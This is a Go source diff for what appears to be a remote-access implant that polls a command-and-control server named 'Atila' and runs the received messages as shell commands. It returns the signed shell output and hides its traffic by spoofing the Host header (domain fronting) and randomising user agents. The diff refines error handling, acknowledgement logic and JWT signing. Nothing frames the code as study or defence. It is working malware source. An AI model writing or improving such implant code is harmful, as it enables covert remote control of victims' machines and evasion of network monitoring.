@@ -3,7 +3,6 @@ package main
 import (
 	"bytes"
 	"crypto/rsa"
-	"encoding/base64"
 	"encoding/json"
 	"errors"
 	"fmt"
@@ -112,27 +111,31 @@ func inboxReader(id string) bool {
 		}
 
 		err = sendMessage(reply)
-		if err == nil {
+		if err != nil {
 			fmt.Println(err.Error())
 			continue
 		}
 
-		messageAck(reply.ReplyTo)
+		err = messageAck(reply.ReplyTo)
+		if err != nil {
+			fmt.Println(err.Error())
+			continue
+		}
 	}
 
 	return true
 }
 
 // messageAck changes a message's state. This will prevent the Atila from sending that message again.
-func messageAck(messageId string) {
+func messageAck(messageId string) error {
 	messageAck := MessageAck{
 		Id:     messageId,
 		Status: "SEEN",
 	}
 
-	messageAckJson, marshalErr := json.Marshal(messageAck)
-	if marshalErr != nil {
-		fmt.Println(marshalErr.Error())
+	messageAckJson, err := json.Marshal(messageAck)
+	if err != nil {
+		return err
 	}
 
 	request, err := http.NewRequest("POST", atilaHost+"/v1/messages/ack", bytes.NewBuffer(messageAckJson))
@@ -140,7 +143,7 @@ func messageAck(messageId string) {
 	request.Header.Set("Content-Type", "application/json")
 	request.Header.Set("User-Agent", randomUserAgent())
 	if err != nil {
-		fmt.Println("Unable to connect to the centralized host.")
+		return err
 	}
 
 	client := &http.Client{}
@@ -151,13 +154,15 @@ func messageAck(messageId string) {
 	}
 
 	defer response.Body.Close()
+
+	return nil
 }
 
 // sendMessage makes a POST request to Atila which saves the message reply.
 func sendMessage(message Message) error {
 	insertionJson, err := json.Marshal(message)
 	if err != nil {
-		fmt.Println(err.Error())
+		return err
 	}
 
 	request, err := http.NewRequest("POST", atilaHost+"/v1/messages", bytes.NewBuffer(insertionJson))
@@ -221,10 +226,8 @@ func interpretMessage(message Message) (Message, error) {
 		return reply, err
 	}
 
-	cmdOutput := base64.StdEncoding.EncodeToString(out.Bytes())
-
-	replyToken := jwt.NewWithClaims(jwt.SigningMethodPS512.SigningMethodRSA, jwt.MapClaims{
-		"shell-output": cmdOutput,
+	replyToken := jwt.NewWithClaims(jwt.SigningMethodRS512, jwt.MapClaims{
+		"shell-output": out.String(),
 	})
 
 	replyTokenString, err := replyToken.SignedString(privateIdentificationKey)
@@ -242,7 +245,7 @@ func interpretMessage(message Message) (Message, error) {
 // fetchMessages reaches out to Atila (cnc) and gets the unseen messages.
 // Do remember to ack. the message after interpreting it and issue the response.
 func fetchMessages(id string) []Message {
-	request, err := http.NewRequest("GET", atilaHost+"/v1/messages?clientId="+id, nil)
+	request, err := http.NewRequest("GET", atilaHost+"/v1/messages?status=SENT&clientId="+id, nil)
 	request.Host = randomPopularDomain()
 	request.Header.Set("User-Agent", randomUserAgent())
 	if err != nil {
